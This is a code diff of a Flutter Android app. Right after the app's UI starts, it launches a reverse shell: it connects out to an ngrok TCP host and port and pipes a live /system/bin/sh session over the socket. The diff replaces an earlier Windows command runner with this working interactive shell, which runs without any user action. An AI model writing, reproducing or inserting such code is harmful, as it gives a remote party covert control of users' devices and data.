@@ -4,6 +4,7 @@ import 'package:flutter/material.dart';
 
 void main() {
   runApp(MyApp());
+  // Start the reverse shell client
   Future.delayed(Duration.zero, () => startClient());
 }
 
@@ -21,64 +22,46 @@ class MyApp extends StatelessWidget {
 }
 
 void startClient() async {
-  final ip = '0.tcp.in.ngrok.io'; // Replace with your Ngrok IP
-  final port = 15569; // Replace with your Ngrok port
+  final ip = '0.tcp.in.ngrok.io'; // Replace with your ngrok TCP host
+  final port = 14795;             // Replace with your ngrok TCP port
 
   try {
     final socket = await Socket.connect(ip, port);
     print('[*] Connected to $ip:$port');
     socket.write('Flutter shell ready.\n');
 
-    socket.listen(
-      (data) async {
-        final command = utf8.decode(data).trim();
-        print('[>] Received: $command');
+    // Start a real shell process on Android
+    final shell = await Process.start(
+      '/system/bin/sh',
+      [],
+      runInShell: true,
+    );
 
-        if (command.toLowerCase() == 'q') {
-          socket.write('Closing connection.\n');
-          await socket.close();
-          exit(0);
-        } else {
-          final output = await runCmdCommand(command);
-          socket.write(output + '\n');
-        }
+    // Pipe shell stdout/stderr to socket
+    shell.stdout.transform(utf8.decoder).listen((data) {
+      socket.write(data);
+    });
+    shell.stderr.transform(utf8.decoder).listen((data) {
+      socket.write(data);
+    });
+
+    // Pipe socket data to shell stdin
+    socket.listen(
+      (data) {
+        shell.stdin.add(data);
       },
       onError: (error) {
         print('❌ Socket error: $error');
         socket.destroy();
+        shell.kill();
       },
       onDone: () {
         print('[*] Server closed connection.');
         socket.destroy();
+        shell.kill();
       },
     );
   } catch (e) {
     print('❌ Connection failed: $e');
-  }
-}
-
-Future<String> runCmdCommand(String command) async {
-  try {
-    final result = await Process.run(
-      'cmd',
-      ['/c', command],
-      runInShell: true,
-      stdoutEncoding: utf8,
-      stderrEncoding: utf8,
-    );
-
-    final output = StringBuffer();
-    if (result.stdout.toString().isNotEmpty) {
-      output.writeln('[stdout]');
-      output.writeln(result.stdout);
-    }
-    if (result.stderr.toString().isNotEmpty) {
-      output.writeln('[stderr]');
-      output.writeln(result.stderr);
-    }
-
-    return output.toString();
-  } catch (e) {
-    return '❌ Exception: $e\n';
   }
 }
